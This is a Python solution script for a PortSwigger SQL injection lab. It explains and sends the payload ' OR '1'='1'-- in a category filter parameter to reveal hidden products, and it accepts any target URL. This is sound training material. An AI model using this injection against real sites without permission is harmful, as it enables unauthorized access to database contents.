# Lab 01 — SQL Injection: WHERE Clause Hidden Data Retrieval
# PortSwigger: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
#
# Vulnerability: Product category filter parameter
# Aim:           Return unreleased products (released=0) hidden by the WHERE clause
#
# Normal query:
#   SELECT * FROM products WHERE category='Gifts' AND released=1
#
# Injected query:
#   SELECT * FROM products WHERE category='Gifts' OR '1'='1'-- AND released=1
#   → OR '1'='1' is always TRUE → all products returned
#   → -- comments out the AND released=1 filter
#
# Usage: python lab1.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import check_vulnerability, banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH  = "filter"
SQL_PAYLOAD  = "' OR '1'='1'--"


def exploit(url):
    section("Submitting SQLi Payload")
    print(f"  ➜  Payload: {SQL_PAYLOAD}\n")

    response = requests.get(
        url + FILTER_PATH,
        params={"category": SQL_PAYLOAD},
        proxies=proxies,
        verify=False,
    )

    print(f"  {'✔' if response.status_code == 200 else '✘'}  [{response.status_code}]")

    if response.status_code == 200:
        print("\n  ★  Exploit successful — hidden products retrieved.")
    else:
        print("\n  ✘  Exploit failed.")


if __name__ == "__main__":
    banner()
    section("LAB 01 — HIDDEN DATA RETRIEVAL")

    if len(sys.argv) != 2:
        print("  Usage: python lab1.py <url>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/") + "/"

    if not check_vulnerability(target, FILTER_PATH):
        print("\n  ✘  Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    exploit(target)
